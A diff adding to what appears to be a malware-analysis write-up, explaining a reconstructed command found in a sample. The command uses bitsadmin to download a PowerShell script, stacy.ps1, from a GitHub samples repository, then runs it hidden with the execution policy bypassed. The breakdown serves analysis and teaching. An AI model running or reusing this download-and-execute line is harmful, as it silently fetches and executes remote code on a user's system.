@@ -104,3 +104,33 @@ Using the same techniques from the sections before to reconstruct the command ex
 ```batch
 bitsadmin.exe /transfer "f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810" https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 cd\stacy.ps1 && powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND cd\stacy.ps1
 ```
+
+As seen above, the command uses **bitsadmin** and **powershell** to download and execute a powershell script named **stacy.ps1**
+
+Below are the command breakdown.
+
+* **`bitsadmin.exe /transfer`**:
+  * [`bitsadmin.exe`](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) is a command-line tool used to create, manage, and monitor download and upload jobs. It is often used to perform file transfers in the background.
+  * `/transfer` is a parameter used to create a new transfer job. In this context, it’s downloading a file.
+* **`"f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810"`**:
+  * This is the job name or identifier for the `bitsadmin` transfer job. It’s a unique identifier for this particular download job.
+* **`https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1`**:
+  * This is the URL from which the file (`stacy.ps1`) will be downloaded. The file is a PowerShell script hosted on GitHub.
+* **`cd\stacy.ps1`**:
+  * This specifies the local path where the file will be saved. In this case, it’s attempting to save it to the root directory of the current drive (`C:\`) with the name `stacy.ps1`.
+* **`&&`**:
+  * This is a conditional operator in batch scripts. It runs the command following `&&` only if the preceding command (`bitsadmin.exe`) succeeds.
+*   **`powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND cd\stacy.ps1`**:
+
+    * This is the PowerShell command that will be executed if the file download is successful.
+
+    **Flags and Parameters**:
+
+    * `-NoP` (or `-NoProfile`): Runs PowerShell without loading the profile scripts, which can speed up execution and reduce potential interference.
+    * `-wiNdowSTYLE hiddeN`: Sets the PowerShell window to be hidden. This makes the execution less noticeable to users.
+    * `-ExEcuTioNPolicy BypAss`: Bypasses the execution policy. By default, PowerShell restricts script execution, but this flag allows scripts to run regardless of policy settings.
+    * `-CoMmAND cd\stacy.ps1`: Specifies the command to run, which is to execute the PowerShell script located at `C:\stacy.ps1`.
+
+***
+
+## Reversing stacy.ps1
